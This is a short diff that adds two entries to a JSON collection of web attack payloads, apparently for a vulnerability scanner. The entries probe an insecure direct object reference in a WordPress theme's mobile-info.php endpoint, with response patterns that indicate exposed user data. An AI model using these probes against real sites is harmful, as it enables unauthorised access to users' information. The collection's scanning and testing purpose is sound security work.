@@ -5509,5 +5509,27 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-407599",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/wp-content/themes/haberadam/api/mobile-info.php?id=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "id|user"
+    }
+  },
+  {
+    "payload_id": "OWP-407600",
+    "vulnerability_category": "Broken Access Control (IDOR)",
+    "target_technology": "WordPress",
+    "injection_point": "path_parameter",
+    "payload_string": "/blog/wp-content/themes/haberadam/api/mobile-info.php?id=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "id|user"
+    }
   }
 ]
